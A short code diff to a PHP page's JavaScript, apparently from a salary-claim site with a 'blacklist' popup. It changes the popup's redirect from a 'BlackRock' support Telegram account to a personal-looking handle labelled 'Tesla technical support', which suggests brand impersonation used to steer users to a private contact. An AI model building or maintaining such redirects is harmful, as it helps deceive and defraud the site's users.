@@ -566,8 +566,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['reclamer_salaire'])) 
         
         function closePopup() {
             document.getElementById('blacklistPopup').style.display = 'none';
-            // Rediriger vers le service client (URL conservée)
-            window.open('https://t.me/blackrock_support', '_blank');
+            // Rediriger vers le support technique Tesla
+            window.open('https://t.me/sarahicardi12', '_blank');
         }
         
         // Fermer le popup en cliquant à l'extérieur
